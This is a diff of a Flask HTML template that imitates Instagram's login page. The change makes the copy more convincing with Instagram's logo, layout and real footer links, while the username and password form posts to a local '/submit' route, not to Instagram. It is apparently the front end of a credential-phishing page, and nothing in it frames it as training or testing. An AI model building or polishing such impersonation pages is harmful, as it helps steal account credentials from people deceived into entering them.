@@ -1,24 +1,38 @@
-<!-- templates/login.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
     <title>Instagram Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <div class="login-container">
-        <h2>Instagram</h2>
-        <form action="/submit" method="post">
-            <div class="form-group">
-                <input type="text" name="username" placeholder="Username" required>
+    <div class="container">
+        <div class="left-side">
+            <img src="https://via.placeholder.com/600x800.png?text=Instagram+Graphics" alt="Instagram Graphics" class="graphics">
+        </div>
+        <div class="right-side">
+            <div class="login-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+                <form action="/submit" method="POST">
+                    <div class="input-group">
+                        <input type="text" name="username" placeholder="Username" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-button">Log In</button>
+                </form>
+                <div class="footer-links">
+                    <a href="https://www.instagram.com/accounts/password/reset/" class="footer-link">Forgot password?</a>
+                    <div class="divider"></div>
+                    <p class="footer-text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="footer-link">Sign up</a></p>
+                </div>
+                <div class="footer-info">
+                    <p class="footer-text"><a href="https://help.instagram.com/" class="footer-link">Help</a> • <a href="https://www.instagram.com/about/us/" class="footer-link">About</a> • <a href="https://www.instagram.com/about/jobs/" class="footer-link">Jobs</a> • <a href="https://www.instagram.com/legal/privacy/" class="footer-link">Privacy</a> • <a href="https://www.instagram.com/legal/terms/" class="footer-link">Terms</a></p>
+                </div>
             </div>
-            <div class="form-group">
-                <input type="password" name="password" placeholder="Password" required>
-            </div>
-            <button type="submit">Log In</button>
-        </form>
+        </div>
     </div>
 </body>
 </html>
